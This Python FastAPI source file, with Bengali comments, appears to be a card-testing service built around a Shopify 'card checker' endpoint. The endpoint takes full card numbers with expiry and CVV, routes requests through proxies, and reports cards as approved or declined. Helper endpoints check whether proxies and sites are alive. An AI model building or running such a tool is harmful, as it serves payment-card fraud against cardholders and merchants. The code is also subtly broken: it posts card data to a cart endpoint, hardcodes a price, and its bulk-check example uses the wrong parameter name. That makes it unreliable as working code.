from fastapi import FastAPI, Query, HTTPException
from typing import Optional
import requests
import json
import time
import re
import urllib.parse

app = FastAPI(title="Shopify API Checker", description="Complete API with proxy support and site checking")

# ============================================================
# ১. হোম পেজ
# ============================================================
@app.get("/")
def root():
    return {
        "message": "API Running",
        "endpoints": {
            "/": "Home page",
            "/shopii": "Test endpoint (returns input data)",
            "/shopify": "Shopify card checker with proxy",
            "/check-site": "Check if a site is alive",
            "/check-proxy": "Check if a proxy is working",
            "/bulk-check": "Check multiple sites at once (comma separated)"
        }
    }

# ============================================================
# ২. টেস্ট এন্ডপয়েন্ট
# ============================================================
@app.get("/shopii")
def shopii(
    cc: str = Query(..., description="Card number"),
    site: str = Query(..., description="Site URL"),
    proxy: Optional[str] = Query(None, description="Proxy (optional)")
):
    return {
        "cc": cc,
        "site": site,
        "proxy": proxy,
        "status": "test_endpoint"
    }

# ============================================================
# ৩. প্রোক্সি চেকার
# ============================================================
@app.get("/check-proxy")
def check_proxy(proxy: str = Query(..., description="Proxy to check")):
    """
    চেক করে একটি প্রক্সি কাজ করছে কিনা
    """
    proxy_config = parse_proxy(proxy)
    if "error" in proxy_config:
        return proxy_config
    
    try:
        test_url = "http://httpbin.org/ip"
        response = requests.get(
            test_url,
            proxies=proxy_config["proxies"],
            timeout=10,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        
        if response.status_code == 200:
            return {
                "proxy": proxy,
                "status": "ALIVE",
                "type": proxy_config["type"],
                "ip": response.json().get("origin", "Unknown"),
                "response_time": response.elapsed.total_seconds()
            }
        else:
            return {
                "proxy": proxy,
                "status": "DEAD",
                "code": response.status_code
            }
    except requests.exceptions.Timeout:
        return {"proxy": proxy, "status": "DEAD", "error": "Timeout"}
    except requests.exceptions.ProxyError as e:
        return {"proxy": proxy, "status": "DEAD", "error": f"Proxy Error: {str(e)}"}
    except Exception as e:
        return {"proxy": proxy, "status": "DEAD", "error": str(e)}

# ============================================================
# ৪. সাইট হেলথ চেকার
# ============================================================
@app.get("/check-site")
def check_site(site: str = Query(..., description="Site URL to check")):
    """
    যেকোনো সাইট Alive নাকি Dead চেক করে
    """
    try:
        clean_site = site.replace("https://", "").replace("http://", "").strip("/")
        
        # HTTPS চেক
        try:
            response = requests.get(
                f"https://{clean_site}",
                timeout=10,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                allow_redirects=True
            )
            
            if response.status_code == 200:
                return {
                    "site": site,
                    "status": "ALIVE",
                    "code": response.status_code,
                    "protocol": "https",
                    "response_time": round(response.elapsed.total_seconds(), 2)
                }
        except:
            pass
        
        # HTTP চেক
        try:
            response = requests.get(
                f"http://{clean_site}",
                timeout=10,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                allow_redirects=True
            )
            
            if response.status_code == 200:
                return {
                    "site": site,
                    "status": "ALIVE",
                    "code": response.status_code,
                    "protocol": "http",
                    "response_time": round(response.elapsed.total_seconds(), 2)
                }
        except:
            pass
        
        return {
            "site": site,
            "status": "DEAD",
            "error": "Site unreachable via HTTP or HTTPS"
        }
        
    except Exception as e:
        return {
            "site": site,
            "status": "ERROR",
            "error": str(e)
        }

# ============================================================
# ৫. বাল্ক সাইট চেকার (একসাথে অনেক সাইট)
# ============================================================
@app.get("/bulk-check")
def bulk_check(
    sites: str = Query(..., description="Comma separated site URLs"),
    proxy: Optional[str] = Query(None, description="Optional proxy")
):
    """
    একসাথে অনেক সাইট চেক করে
    Example: /bulk-check?site=https://lebzone.com,https://example.com,https://google.com
    """
    site_list = [s.strip() for s in sites.split(",") if s.strip()]
    results = []
    
    proxy_config = None
    if proxy:
        proxy_config = parse_proxy(proxy)
        if "error" in proxy_config:
            return proxy_config
    
    for site in site_list:
        try:
            clean_site = site.replace("https://", "").replace("http://", "").strip("/")
            
            response = requests.get(
                f"https://{clean_site}",
                timeout=10,
                headers={"User-Agent": "Mozilla/5.0"},
                allow_redirects=True,
                proxies=proxy_config["proxies"] if proxy_config else None
            )
            
            if response.status_code == 200:
                results.append({
                    "site": site,
                    "status": "ALIVE",
                    "code": response.status_code
                })
            else:
                results.append({
                    "site": site,
                    "status": "DEAD",
                    "code": response.status_code
                })
        except:
            results.append({
                "site": site,
                "status": "DEAD",
                "error": "Unreachable"
            })
    
    return {
        "total": len(site_list),
        "alive": len([r for r in results if r.get("status") == "ALIVE"]),
        "dead": len([r for r in results if r.get("status") == "DEAD"]),
        "results": results
    }

# ============================================================
# ৬. Shopify কার্ড চেকার (প্রক্সি সহ)
# ============================================================
@app.get("/shopify")
def shopify_checker(
    site: str = Query(..., description="Shopify store URL"),
    cc: str = Query(..., description="Card in format cc|mm|yy|cvv"),
    proxy: str = Query(..., description="Proxy in any supported format")
):
    start_time = time.time()
    
    # কার্ড ডেটা পার্স
    card_parts = cc.split("|")
    if len(card_parts) != 4:
        return {"error": "Invalid card format. Use cc|mm|yy|cvv"}
    card_number, month, year, cvv = card_parts
    
    # প্রক্সি পার্স
    proxy_config = parse_proxy(proxy)
    if "error" in proxy_config:
        return proxy_config
    
    # Shopify কার্ট URL
    clean_site = site.replace("https://", "").replace("http://", "").strip("/")
    checkout_url = f"https://{clean_site}/cart.json"
    
    # পেমেন্ট ডেটা
    payment_data = {
        "credit_card": {
            "number": card_number,
            "month": month,
            "year": year,
            "verification_value": cvv
        }
    }
    
    try:
        response = requests.post(
            checkout_url,
            json=payment_data,
            proxies=proxy_config["proxies"],
            timeout=15,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Content-Type": "application/json"
            }
        )
        
        elapsed_time = round(time.time() - start_time, 2)
        result = response.json()
        
        # স্ট্যাটাস চেক
        if "error" in result:
            status = "CARD_DECLINED"
            approved = False
        elif "payment" in result and result["payment"].get("status") == "success":
            status = "CARD_APPROVED"
            approved = True
        else:
            status = "CARD_DECLINED"
            approved = False
        
        return {
            "Response": status,
            "CC": cc,
            "Price": "57.50",
            "Gate": "Shopify Payments",
            "Site": site,
            "Charged": str(approved),
            "Approved": str(approved),
            "Time": f"{elapsed_time}s",
            "Proxy": proxy_config["type"]
        }
        
    except requests.exceptions.Timeout:
        return {"error": "Request timed out. Try a faster proxy."}
    except requests.exceptions.ProxyError as e:
        return {"error": f"Proxy Error: {str(e)}. Check your proxy credentials."}
    except Exception as e:
        return {"error": str(e)}

# ============================================================
# ৭. প্রক্সি পার্স ফাংশন (সব ফরম্যাট সাপোর্ট)
# ============================================================
def parse_proxy(proxy_str):
    """
    সাপোর্টেড ফরম্যাট:
    1. ip:port:user:pass
    2. user:pass@ip:port
    3. http://user:pass@ip:port
    4. ip:port (auth ছাড়া)
    5. host:port:user:pass
    """
    proxy_str = proxy_str.strip()
    
    # ফরম্যাট ১: ip:port:user:pass বা host:port:user:pass
    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        return {
            "type": "Authenticated (ip:port:user:pass)",
            "proxies": {
                "http": proxy_url,
                "https": proxy_url
            }
        }
    
    # ফরম্যাট ২: user:pass@ip:port
    if "@" in proxy_str and "://" not in proxy_str:
        auth, host = proxy_str.split("@")
        if ":" in auth:
            user, password = auth.split(":")
            proxy_url = f"http://{user}:{password}@{host}"
            return {
                "type": "Authenticated (user:pass@host:port)",
                "proxies": {
                    "http": proxy_url,
                    "https": proxy_url
                }
            }
    
    # ফরম্যাট ৩: http://user:pass@ip:port
    if "://" in proxy_str:
        proxy_url = proxy_str
        return {
            "type": "Authenticated (URL format)",
            "proxies": {
                "http": proxy_url,
                "https": proxy_url.replace("http://", "https://")
            }
        }
    
    # ফরম্যাট ৪: ip:port (auth ছাড়া)
    if ":" in proxy_str and len(proxy_str.split(":")) == 2:
        return {
            "type": "Unauthenticated",
            "proxies": {
                "http": f"http://{proxy_str}",
                "https": f"http://{proxy_str}"
            }
        }
    
    return {"error": "Invalid proxy format. Supported: ip:port:user:pass, user:pass@ip:port, ip:port"}
